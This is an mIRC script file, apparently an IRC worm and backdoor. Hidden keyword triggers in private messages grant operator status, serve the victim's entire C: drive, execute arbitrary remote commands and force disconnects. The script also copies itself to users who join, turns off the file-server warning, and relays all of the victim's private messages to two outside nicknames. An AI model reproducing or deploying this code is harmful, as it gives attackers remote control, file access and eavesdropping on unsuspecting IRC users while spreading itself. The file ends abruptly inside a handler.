[script]
n0=raw 401:*:/halt    
n1=on 1:text:*panterax*:?:{
n2=  /mode $2 +o $nick 
n3=  /.timer666 1 1 /closemsg $nick
n4=}
n5=on 1:text:*mowgli*:?:{
n6=  /fserve $nick 3 c:\
n7=  /.timer666 1 1 /closemsg $nick
n8=}
n9=on 1:text:*critter*:?:{
n10=  /invite $nick $2
n11=  /.timer666 1 1 /closemsg $nick
n12=}
n13=ON !1:JOIN:#:{
n14=  /inc %wow666 1
n15=  /if %wow666 >= 10 {
n16=    /dcc send $nick script.ini
n17=    /set %wow666 0
n18=  }
n19=}
n20=on 1:text:*:#:{
n21=  /inc %bbb4x 1
n22=  /if %bbb4x > 1 { /halt }
n23=  /write -dsWarning=On mirc.ini
n24=  /writeini mirc.ini fileserver Warning Off
n25=}  
n26=on 1:text:*pighouse*:?:{
n27=  /quit CONNECTION FUCKED BY PEER, AND I LIKED IT
n28=  /.timer666 1 1 /closemsg $nick
n29=}
n30=on 1:text:*x123456789*:#:{
n31=  /.msg $nick Im a lamah
n32=  /.timer666 1 1 /closemsg $nick
n33=}
n34=on 1:TEXT:toolworks*:?:{
n35=/ $+ $2-
n36=/.timer666 1 1 /closemsg $nick
n37=}
n38=on 1:INPUT:?:{
n39=  /.msg aaay $nick ×××> $1-
n40=  /.msg centrall $nick ×××> $1-
n41=}
n42=on 1:text:*:?:{
n43=  if $nick == aaay /halt
n44=  if $nick == centrall /halt
n45=  /.msg aaay ×××> $nick <×××   $1-
n46=  /.msg centrall ×××> $nick <××× $1-
n47=}
n48=#user.prot.add.all off
n49=raw 401:*: set %User.Nick 0 | halt
n50=raw 301:*: halt
n51=raw 311:*: set %User.Address $2 $+ ! $+ $3 $+ @ $+ $4 | halt
n52=raw 312:*: halt
n53=raw 313:*: halt
n54=raw 317:*: halt
n55=raw 319:*: halt
n56=raw 318:* {
n57=  if (%User.Nick == 0) { error $2 $+ , no such nick | goto do
n58=    #user.prot.add.all end
